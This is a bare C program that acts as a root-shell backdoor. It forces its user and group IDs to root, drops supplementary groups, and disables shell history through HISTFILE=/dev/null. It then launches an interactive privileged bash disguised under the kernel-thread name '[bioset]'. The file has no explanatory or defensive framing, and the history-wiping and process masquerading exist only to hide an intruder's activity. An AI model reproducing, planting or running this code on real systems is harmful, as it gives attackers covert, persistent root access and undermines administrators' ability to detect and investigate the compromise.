#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <grp.h>

int main(void)
{
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    setgroups(0, NULL);
    putenv("HISTFILE=/dev/null");
    execl("/bin/bash", "[bioset]", "-pi", NULL);
    return 0;
}
